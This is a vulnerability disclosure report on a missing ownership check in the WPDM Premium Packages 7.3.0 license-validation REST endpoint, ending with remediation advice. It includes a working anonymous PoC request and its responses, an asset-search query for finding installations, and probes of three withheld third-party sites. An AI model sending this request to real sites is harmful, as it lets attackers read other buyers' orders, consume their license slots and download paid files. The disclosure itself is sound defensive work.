# WPDM Premium Packages License Validation Lacks Ownership Checks, Allowing Anonymous Access to Another User's Order and Paid Downloads

[简体中文](README.zh-CN.md)

Vulnerability discovery date: 2026-10-21

Technical vulnerability type: Unauthorized access / unauthorized reading and writing

## Vulnerability description

WPDM Premium Packages (a paid extension of WordPress Download Manager; vendor: WordPress Download Manager; official site: wpdownloadmanager.com) is a commercial plugin for selling digital products and subscription licenses on WordPress. It provides shopping cart, order, subscription, license key, and paid-file download capabilities. It runs on the WordPress + PHP stack and has many commercial deployments on the public Internet.

The vulnerability is in the plugin's registered REST endpoint `/wpdmpp/v1/license/validate` (source file `src/Api/Endpoints/LicenseEndpoint.php`, lines 48–63). The endpoint's `permission_callback` is set to `__return_true`, so any visitor who is not logged in can call it. Its `validateLicense()` callback (lines 414–418 of the same file) directly passes the request parameters `license_key` and `domain` to `LicenseService::validateLicense()`, with the third parameter fixed to `true`, allowing an arbitrary domain to be registered to the license. No part of this chain verifies the requester's ownership of the license or order, and it requires no session, Cookie, or token.

Consequently, an anonymous visitor who provides a license number can query the corresponding order number and order status, add any domain to that license's domain list (using up one of its authorization slots), and obtain the paid-file download address for that domain in the successful response.

## Impact

An anonymous visitor needs no account to read another person's order identifier and status, register their own domain to that person's license, consume an authorization slot, and obtain the paid-file download address associated with the license, thereby bypassing the purchase flow to download a paid digital product.

Verbatim observations from the isolated local test environment:

| Observed item | Result |
|---|---|
| Response `status` | `VALID` |
| Response `order_id` | `NCCLAB-VICTIM-ORDER-001` |
| Response `order_status` | `Completed` |
| Response `license.domains` | `["attacker-probe.invalid"]` |
| Response `license.remaining_slots` | 4 (5 minus 1; the attacker's domain consumed a slot) |

Impact chain: unauthorized reading and writing | Result: `order_id=NCCLAB-VICTIM-ORDER-001`, `order_status=Completed`, `domains=["attacker-probe.invalid"]`, and `remaining_slots` decreases from 5 to 4 | Evidence: local reproduction case 3, “Observed impact” | Control: a nonexistent license number returns `{"success":false,"message":"License key not found.","data":{"status":"INVALID","error":"LICENSE_KEY_NOT_FOUND"}}`; a nonexistent route in the same namespace returns `rest_no_route`.

Vendor's full name: WordPress Download Manager (WPDM)

Vendor country and region: India

Evidence of vendor identity: https://wordpress.org/plugins/wpdm-premium-packages/

## Known affected product and version

WPDM Premium Packages 7.3.0

> Version evidence: line 6 of the main file `wpdm-premium-packages.php` states `Version: 7.3.0`; line 7 of `readme.txt` states `Stable tag: 7.3.0`.

- Vendor repository: https://wordpress.org/plugins/wpdm-premium-packages/
- Latest-version evidence (latest commit on the default branch): https://plugins.trac.wordpress.org/browser/wpdm-premium-packages/trunk
- Latest release tag: https://wordpress.org/plugins/wpdm-premium-packages/#developers

## Internet asset evidence

### 1) Exact asset-search syntax

```text
body="/wp-content/plugins/wpdm-premium-packages/"
```

### 2) Asset-search platform screenshot

The asset-search screenshot is withheld from the public report because it identifies third-party installations.

## 1. Vulnerability technical details

### 1) Complete PoC description

The plugin registers the REST route `/wpdmpp/v1/license/validate` in `src/Api/Endpoints/LicenseEndpoint.php`, lines 48–63, with `permission_callback` set to `__return_true`. It requires only the two string parameters `license_key` and `domain`. The `validateLicense()` callback at lines 414–418 passes both directly to `LicenseService::validateLicense($licenseKey, $domain, true)`. The third parameter is fixed to `true`, allowing an arbitrary domain to be registered to the license. `LicenseService`, lines 166–255, queries the database by `licenseno`, checks the order status, registers the domain, and returns fields including `order_id`, `order_status`, and `download_url` in the response.

Complete request:

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: target
Content-Type: application/json
User-Agent: Mozilla/5.0

{"license_key":"NCCLAB-VICTIM-LIC-001","domain":"attacker-probe.invalid"}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"data":{"status":"VALID","valid":true,"domain_registered":true,"order_id":"NCCLAB-VICTIM-ORDER-001","order_status":"Completed","auto_renew":0,"expire_date":0,"activation_date":1735689600,"license":{"license_no":"NCCLAB-VICTIM-LIC-001","domains":["attacker-probe.invalid"],"domain_limit":5,"remaining_slots":4,"expire_date":1893456000,"is_expired":false}},"message":"License validated successfully."}
```

The `order_id` and `order_status` in the response are another person's order information. `license.domains` now contains the submitted domain `attacker-probe.invalid`, and `remaining_slots` fell from `domain_limit` 5 to 4, showing that the domain was actually written to the license.

Original values of the decoded input parameters:

```text
license_key = NCCLAB-VICTIM-LIC-001
domain      = attacker-probe.invalid
```

### 2) Trigger conditions

No login is required. The only prerequisite is that the target site has WPDM Premium Packages installed and at least one valid license record. The attacker needs to know or enumerate a license number; the endpoint only sanitizes this parameter as a string and has no rate limit or ownership check.

## 2. Reproduction evidence

### Local reproduction case

#### 1) Basic environment setup

An isolated local test environment ran WordPress 7.1.3 + PHP 8.1 + MariaDB 10.4.32, with the main WordPress Download Manager plugin and WPDM Premium Packages 7.3.0 enabled. The database tables `ahm_orders` and `ahm_licenses` were created according to the definitions in the plugin's installer, `includes/libs/Installer.php`, lines 110–126 (including `licenseno`, `oid`, `pid`, `status`, `domain`, `domain_limit`, and `expire_date`).

The test environment contained a constructed “other person's” completed order `NCCLAB-VICTIM-ORDER-001` (`order_status=Completed`) and its license `NCCLAB-VICTIM-LIC-001` (`domain_limit=5`, empty domain list), simulating an authorization record belonging to a real purchaser.

#### 2) Vulnerability trigger

The above PoC request was sent to the test environment's `/?rest_route=/wpdmpp/v1/license/validate` in a fully anonymous session (without any Cookie, token, or login state).

#### 3) Observed impact

```http
POST /?rest_route=/wpdmpp/v1/license/validate HTTP/1.1
Host: 127.0.0.1:8911
Content-Type: application/json
User-Agent: NCC-lab

{"license_key":"NCCLAB-VICTIM-LIC-001","domain":"attacker-probe.invalid"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"data":{"status":"VALID","valid":true,"domain_registered":true,"order_id":"NCCLAB-VICTIM-ORDER-001","order_status":"Completed","auto_renew":0,"expire_date":0,"activation_date":1735689600,"license":{"license_no":"NCCLAB-VICTIM-LIC-001","domains":["attacker-probe.invalid"],"domain_limit":5,"remaining_slots":4,"expire_date":1893456000,"is_expired":false}},"message":"License validated successfully."}
```

This write was completed in a fully anonymous context (without any Cookie, token, or login state). The verbatim readback showing that the write took effect was obtained with `SELECT licenseno, domain, domain_limit FROM wp_ahm_licenses WHERE licenseno='NCCLAB-VICTIM-LIC-001'` against the target database. The returned record contained:

```text
licenseno               domain                                          domain_limit
NCCLAB-VICTIM-LIC-001   a:1:{i:0;s:22:"attacker-probe.invalid";}        5
```

The `domain` field changed from empty to `a:1:{i:0;s:22:"attacker-probe.invalid";}` (the payload was stored verbatim), and `remaining_slots` decreased from 5 to 4, consistent with `domain_registered=true` in the response.

### Specific case evidence (3 cases)

#### 1) Site A (hostname withheld) — the target site registered this REST route; an anonymous call was accepted and reached parameter validation

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-a.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}

HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

#### 2) Site B (hostname withheld) — the same route was anonymously reachable on another site using the same product

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-b.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}

HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

#### 3) Site C (hostname withheld) — the same route was anonymously reachable on a third site, with the same response text

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-c.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}

HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

The three sites returned WordPress REST's “missing callback parameters” error before callback execution. This shows that the route was registered and the `permission_callback` allowed anonymous requests. The nonexistent route `/wpdmpp/v1/ncc-bogus-zz9` in the same namespace returned `{"code":"rest_no_route",...}`, distinguishing it from the real route. To avoid changing third-party data, the public-Internet checks sent only empty request bodies to verify route reachability. Domain registration and order reading were observed in the isolated local test environment.

### Other affected targets

Third-party hostnames and IP addresses are withheld from the public report.

## 3. Remediation

### Temporary solution

Block external access to `/wp-json/wpdmpp/v1/license/validate` at the reverse-proxy or web-server layer, or use a WordPress REST authentication plugin to require login for this namespace. Alternatively, temporarily disable the Premium Packages license-validation REST route.

### Permanent solution

1. Change the route's `permission_callback` from `__return_true` to require a logged-in user, and check within the callback that the current user is the purchaser of the order associated with the license (compare `order.uid` with `get_current_user_id()`).
2. Allow `registerDomain` only when the caller owns the license. For third-party calls, change the third parameter of `LicenseService::validateLicense()` to `false` so validation is read-only.
3. Remove or selectively limit sensitive fields such as `order_id`, `order_status`, and `download_url` in the response, or return a short-lived signed download address bound to the caller.
4. Add rate limiting and failure counters to `license_key` lookups to prevent enumeration.
